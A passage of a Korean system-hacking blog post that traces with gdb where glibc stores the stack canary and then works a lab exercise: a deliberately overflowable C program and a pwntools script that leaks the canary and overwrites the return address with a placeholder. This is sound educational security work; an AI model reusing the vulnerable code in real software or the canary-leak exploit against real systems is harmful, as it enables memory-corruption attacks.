&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS_INIT_TP&lt;/code&gt; 가 실행되면  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ARCH_SET_FS&lt;/code&gt; 가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 에 들어가 있을 것이다. 그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ARCH_SET_FS&lt;/code&gt; 는 어떤 값을 가지고 있을까?&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//prctl.h&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#ifndef _ASM_X86_PRCTL_H
#define _ASM_X86_PRCTL_H
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define ARCH_SET_GS 0x1001
#define ARCH_SET_FS 0x1002
#define ARCH_GET_FS 0x1003
#define ARCH_GET_GS 0x1004
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* _ASM_X86_PRCTL_H */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS_INIT_TP&lt;/code&gt; 가 명시된 소스 코드에 include된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys/prctl.h&lt;/code&gt; 의 소스를 보니, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1002&lt;/code&gt;인 것으로 확인되었다.&lt;/p&gt;

&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS_INIT_TP&lt;/code&gt; 가 실행되면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1002&lt;/code&gt; 가 저장되고, 목표했던 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt;(__NR_arch_prctl; 여기에서 NR은 달라지는 아키텍처에 따라 시스콜이 추가되면서 호환성을 위해 각 아키텍처별로 다르게 호명할 수 있도록 호환성을 보장하기 위한 태그다. 자세한 건 &lt;a href=&quot;https://man7.org/linux/man-pages/man2/syscall.2.html&quot;&gt;여기&lt;/a&gt;에서)이 수행되며 FS에 TLS 구조체의 시작값이 할당될 것이다.&lt;/p&gt;

&lt;p&gt;정말로 그런지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS_INIT_TP&lt;/code&gt; 가 콜되기 직전에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; 에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1002&lt;/code&gt; 가 들어간 게 보인다. 콜되기 전에 미리 파라미터가 레지스터에 들어간 것으로 미루어 보았을 때 아마도 컴파일러의 최적화 때문에 순서가 당겨진 것 같다.&lt;/p&gt;

&lt;p&gt;그리고 같은 이유로 인해 이미 시스콜이 수행되며 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r12&lt;/code&gt;에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS&lt;/code&gt; 의 시작값이 들어간 것이 확인되었다&lt;sup id=&quot;fnref:r12&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:r12&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;. 실제로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs&lt;/code&gt; 에 할당된 값이 맞는지 명령어를 통해 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2013.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;맞는 것으로 확인되었다.&lt;/p&gt;

&lt;p&gt;앞에 $가 붙은 것은 gdb상에서 심볼로 취급되므로 명령어 인라인에 사용할 수 있다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base&lt;/code&gt; 가 가리키는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS&lt;/code&gt; 에 무엇이 저장되었는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2014.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그렇다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base+0x28&lt;/code&gt;, 즉 스택 카나리가 저장되는 위치에 스택 카나리가 저장되어 있는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2015.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아직은 아무것도 저장되어 있지 않은 것을 확인할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-스택-카나리의-저장-과정-추적&quot;&gt;2.2. 스택 카나리의 저장 과정 추적&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base+0x28&lt;/code&gt; 위치의 값이 변경될 때가 바로 스택 카나리가 저장될 때일 것이다. 따라서 gdb의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;watch&lt;/code&gt; 명령어로 해당 위치의 값이 변경될 때 코드 플로우를 멈추도록 해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2016.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; 심볼은 참조한다는 뜻이다. 즉, 해당 주소를 참조해 내부의 값을 감시한다는 뜻이 되기 때문에 특정 주소의 값 변화를 감시하기 위해서는 반드시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; 심볼을 사용해야 한다.&lt;/p&gt;

&lt;p&gt;프로세스를  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; 명령어로 이어서 수행한 결과, 아래와 같은 결과가 나왔다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2017.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;값이 변화되자 코드 플로우가 멈추고 값이 어떻게 변화했는지가 출력된다. 정지하는 시점에서 실행되던 함수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security_init&lt;/code&gt; 라고 명시되어 있다. 이제 실제로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fs_base+0x28&lt;/code&gt; 위치의 값이 어떻게 되었는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2018.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2019.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;스택 카나리 값이 저장된 것이 확인되었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;23-main에서-사용되는-스택-카나리-확인&quot;&gt;2.3. main에서 사용되는 스택 카나리 확인&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 실제로 해당 값이 main 함수에서 사용되는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2020.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rax, qword prt fs:[0x28]&lt;/code&gt; 명령어가 실행된 직후의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; 를 확인해 보니, 정말로 직전에 확인했던 스택 카나리 값이 저장된 것을 볼 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-카나리-우회&quot;&gt;3. 카나리 우회&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;카나리를 포함한 각종 메모리 보호 기법 우회 관련해서는 이미 &lt;a href=&quot;https://toubva.github.io/blog/system_hacking/memory-exploit-mitigation-bypass-01/#/&quot;&gt;이전 포스트&lt;/a&gt;에서 다룬 바가 있지만, 한 번 더 정리하려 한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;31-brute-force&quot;&gt;3.1. Brute Force&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 기법을 이용해 카나리를 맞춘다는 것은 불가능에 가깝다.&lt;/p&gt;

&lt;p&gt;카나리 값으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x64&lt;/code&gt;에서는 8byte, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x86&lt;/code&gt;에서는 4byte 길이의 pseudo-random 값이 생성되며, 가장 끝 1byte가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/x00&lt;/code&gt; 인 것을 감안하더라도 각각 7byte, 4byte의 자릿수를 맞춰야 하기 때문이다.&lt;/p&gt;

&lt;p&gt;실제 서버를 대상으로 이 기법을 수행하면 성공하기 한참 전에 경찰에 체포될 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;32-tls-접근-canary-leak&quot;&gt;3.2. TLS 접근-Canary Leak&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;TLS의 주소는 매번 시행할 때마다 바뀌지만, 만일 실행중에 TLS의 주소를 알 수 있고 이에 쓰기나 읽기가 가능하다면 읽어온 카나리 값을 이용하거나, 카나리 값 자체를 변조할 수 있을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;4-카나리-우회-실습&quot;&gt;4. 카나리 우회 실습&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;41-코드-분석&quot;&gt;4.1. 코드 분석&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아래 코드를 컴파일한 프로그램에서 Stack Smashed 감지 없이 오버플로우를 수행해 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Name: bypass_canary.c&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Compile: gcc -o bypass_canary bypass_canary.c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;memo : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;memo %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;가장 먼저 이름을 입력하는 란에 8글자를 입력해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; 함수가 64글자까지를 받기 때문에, 원래는 7글자까지만 사용자 입력을 받은 다음 뒤에 NULL byte가 붙을 것을 상정하고 선언된 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; 배열은 충분히 오버플로우될 수 있다.&lt;/p&gt;

&lt;p&gt;즉, 스택 카나리의 최하위 1byte가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x00&lt;/code&gt;, 즉 NULL byte로 설정되는 특성과 리틀 엔디안으로 가장 작은 자릿수가 가장 먼저 인식된다는 점을 감안했을 때, Canary Leak을 원하는 사용자는 총 9byte의 입력을 주어 스택 카나리의 최하위에 존재하는 NULL byte를 없애야만 한다.&lt;/p&gt;

&lt;p&gt;이를 그림으로 본다면 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2021.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위와 같았던 메모리를&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2022.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; 변수에 9byte를 넣음으로써 스택 카나리의 최하위 비트인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x00&lt;/code&gt; 이 지워지게 만들었다.&lt;/p&gt;

&lt;p&gt;이후 name 변수를 출력하기 위해  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 함수를 사용하는데, 해당 함수는 null byte를 문자열의 끝으로 보고 메모리 읽기를 멈추는 특성이 있기 때문에 스택 카나리까지를 고스란히 출력하게 된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;42-익스플로잇-구성&quot;&gt;4.2. 익스플로잇 구성&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 익스플로잇을 짜 보자.&lt;/p&gt;

&lt;p&gt;익스플로잇에 구현되어야 할 기능은 다음과 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;총 9 byte의 입력값을 준다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendline()&lt;/code&gt; 함수를 사용한다면 끝에 개행 문자가 자동으로 붙는 것을 감안하여 해당 함수의 인자로 8 byte를 주는 식이다.&lt;/li&gt;
  &lt;li&gt;이후 출력되는 값을 받아오고, 그중 하위 7byte만 저장한다. (문자열 출력 방식에 따라 리틀 엔디안 방식으로 표현된 스택 카나리가 나올 것이다)&lt;/li&gt;
  &lt;li&gt;저장한 값의 최상위 1byte에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x00&lt;/code&gt; 을 저장한다.&lt;/li&gt;
  &lt;li&gt;이후 memo 변수에 대한 입력으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x10&lt;/code&gt; byte의 dump와 스택 카나리 값(리틀 엔디안), 8 byte의 dump, 그리고 RET로 주고 싶은 값을 준다.
    &lt;ul&gt;
      &lt;li&gt;ASLR이 켜져 있고 NX-bit가 활성화되어 있으며 Full-RELRO이기 때문에 이 경우 가능한 익스 방법은 GOT의 base 주소를 leak해서 system 함수의 PLT를 알아낸 다음 RET에 넣어주는 것이다. PLT의 주소를 덮어쓰는 게 불가능하니까…&lt;/li&gt;
      &lt;li&gt;근데 그걸… 지금은 못할 듯? 일단 입력값을 최장 64 byte 만 받고 있기 때문에 현재 libc의 base가 leak되지 않았고 system 함수가 사용되지 않아 plt 심볼을 찾을 수 없는 점을 감안하면 더 돌아 돌아 가야 할 텐데, 그걸 64 byte 이내로 구현 못 하겠다.&lt;/li&gt;
      &lt;li&gt;어떻게 할 지 방법이 안 서는 것도 있고!&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;따라서 익스플로잇의 목적은 리턴 주소를 원하는 값으로 변조하더라도 스택 카나리 변조가 인식되지 않게끔 하는 것으로 결정되었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;43-익스플로잇-실행&quot;&gt;4.3. 익스플로잇 실행&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 작성한 익스플로잇은 아래와 같았다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./bypass_canary&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 1. 9 byte input
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;AAAAAAAA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 2. get 7 bytes(least significant) from output and insert Null byte in front of it
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello AAAAAAAA&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 3. give the payload which I want
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rbp_dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xDEADBEEFCAFECAFE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp_dump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret_addr&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 익스플로잇을 실행한 결과는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2023.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 함수의 가장 마지막 부분에서 스택 카나리 원본과 스택에 저장된 스택 카나리 값을 비교하고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+183&lt;/code&gt; 에서 만일 값이 같다면 정상적으로 프로세스를 종료하고 만일 아니라면 오류를 내보내도록 되어 있다. 따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+183&lt;/code&gt; 에 브레이크 포인트를 걸고 continue해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/sys6/Untitled%2024.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그 결과, rbp의 바로 아래인 ret addr에 내가 의도했던 리턴값이 들어가 있고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x8&lt;/code&gt; 에는 스택 카나리 값이 그대로 들어가 있어 분기 조건에 부합하여 정상적으로 프로그램이 종료되는 루틴을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;번외-삽질이-남긴-지식&quot;&gt;번외: 삽질이 남긴 지식&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-와-리눅스-대상-분석을-하는데-윈도우-프로세스-관리를-가져왔다&quot;&gt;1. 와! 리눅스 대상 분석을 하는데 윈도우 프로세스 관리를 가져왔다?!?&lt;/h2&gt;

